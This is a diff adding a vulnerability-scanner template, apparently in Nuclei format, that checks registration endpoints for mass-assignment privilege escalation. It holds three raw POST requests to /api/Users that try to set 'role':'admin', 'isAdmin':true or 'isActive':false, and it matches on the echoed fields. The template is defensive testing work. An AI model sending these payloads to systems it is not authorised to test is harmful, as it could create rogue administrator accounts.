@@ -1,0 +1,76 @@
+id: generic-mass-assignment
+info:
+  name: Mass Assignment - Privilege Escalation
+  author: dast-mvp
+  description: Tests if registration endpoints accept privilege escalation fields
+  severity: critical
+  tags:
+    - input-validation
+    - privilege-escalation
+    - access-control
+    - generic
+    - auth
+
+http:
+  - raw:
+      - |
+        POST /api/Users HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"email":"mass{{rand_int()}}@test.local","password":"Test1234!","role":"admin"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+      - type: word
+        part: body
+        words:
+          - '"role":"admin"'
+          - '"role": "admin"'
+        condition: or
+
+  - raw:
+      - |
+        POST /api/Users HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"email":"mass{{rand_int()}}@test.local","password":"Test1234!","isAdmin":true}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+      - type: word
+        part: body
+        words:
+          - '"isAdmin":true'
+          - '"isAdmin": true'
+        condition: or
+
+  - raw:
+      - |
+        POST /api/Users HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"email":"mass{{rand_int()}}@test.local","password":"Test1234!","isActive":false}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+      - type: word
+        part: body
+        words:
+          - '"isActive":false'
+          - '"isActive": false'
+        condition: or
